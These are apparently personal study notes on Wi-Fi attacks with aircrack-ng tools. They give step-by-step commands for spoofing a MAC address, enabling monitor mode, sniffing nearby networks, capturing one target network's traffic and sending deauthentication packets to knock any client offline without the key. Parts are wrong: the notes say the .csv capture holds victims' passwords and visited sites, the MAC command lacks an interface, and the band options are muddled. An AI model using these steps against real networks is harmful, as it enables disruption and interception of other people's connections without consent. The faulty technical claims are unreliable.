# IFCONFIG vs IWCONFIG
	ifconfig: deals with all network adapters
	iwconfig: deals with only wireless network interfaces


# CHANGE MAC ADDRESS
(1) [disable network adapter]
	>>ifconfig wlan0 down
(2) [new MAC address should start from 00:...]
	>> ifconfig hw ether <newMAC>
		[hw stands for hardware]
(3) [enable the wireless adapter]
	>>ifconfig wlan0 up


# ENABLE MONITOR MODE
(1) [disable network adapter before ebabling monitor mode] 
	>>ifconfig wlan0 down
(2) [kill all the ongoing network task - precautionary measure + better results]
	>>airmon-ng check kill
(3) [change to monitor mode from managed mode (default)]
	>>iwconfig wlan0 mode monitor
(4) [enable the wireless adapter]
	>>ifconfig wlan0 up
(4.1) [to cross check that monitor mode is enabled - check Mode=___]
	>>iwconfig

# PACKET SNIFFING
(0) Switch to monitor mode (say interface in monitor mode is named as wlan0)
(1) [to discover all wireless network in range]
	airodump-ng wlan0
		[to quit press Ctrl+C]
		
		[ BSSID--> MAC address of target, 
		  PWR--> signal strength, 
		  Beacons--> frames send by network to broadcast its existance,
			(all network devices even if hidden send these types of frames)
		  Data-->
		  #/s--> data packets collected in past 10s
		  CH--> Channel
		  MB--> max speed supported by network
		  AUTH--> security encryption use
		  ESSID--> name]


# WIFI BANDS SNIFFING
(0) default search for airudump-ng is only 2.4GHz.
(1) [To seaarch 5GHz]
	>> airodump-ng --band a wlan0

-->> airodump-ng --band <band/> wlan0
		<band/> = [ a--> 5GHz,
		  	 bg--> both use 2.4 GHz 
		  	 abg--> for both 2.4GHz & 5GHz at the same time
		  	 ac--> lower than 6GHz ]
	* do not specify band if u wanna search 2.4GHz band only


# TARGETED SNIFFING
(1) [To search a specific target]
	>> airodump-ng --bssid 5C:F9:FD:62:FE:09 --channel 7 --write test wlan0

-->> airodump-ng --bssid <bssid/> --channel <ch/> --write <filename/> wlan0
	<bssid/> --> bssid of target
	<ch/> --> channel of target
	<filename/> --> name of file to write sniffed data of target
	* All these information is collected from the output of command "airodump-ng wlan0"

(2) The Output shows the number of devices connected to this network, and their MAC address under "STATION"
	Some devices that are trying to connect to this network will show under "PROBE"

(3) Now, when you quit using Ctrl+C, you can see the output data files (05 files - .cap, .csv, .netxml, .log.csv) with your name provided.

(4) In .csv file, it has everything that the connected devices do with internet, ie. passwords they entered, sites they visited, everyting they have done while you were sniffing.
	* ENCRYPTION: BUT, the data is encrypted using the Security Encryption (WPA2, WPA, WEP) Used by their Wifi Router.
	* OPEN NETWORK: If the network is open network then you can see every url visited, every password entered using 'Wireshark'.

	
# DEAUTHENTICATION ATTACK
(0.1) Disconnect any client from any network
(0.2) Works on encrypted network (WEP, WPA & WPA2)
(0.3) No need to know the network key
(0.4) No need to connect to the network

-->> aireplay-ng --deauth [#DeauthPackets] -a [NetworkMAC] -c [TargetMac] [Interface]
